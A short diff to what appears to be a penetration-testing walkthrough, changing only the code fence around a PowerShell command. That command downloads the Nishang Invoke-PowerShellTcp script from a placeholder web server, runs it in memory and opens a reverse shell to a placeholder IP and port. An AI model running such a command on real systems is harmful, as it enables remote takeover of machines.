@@ -59,9 +59,9 @@ A goood approach is execute the reverseShell in memory, like Nishang project des
 
 The next line is used for this:
 
-``
+```ps
 powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
-``
+```
 
 # 05: Post-Exploitation
 
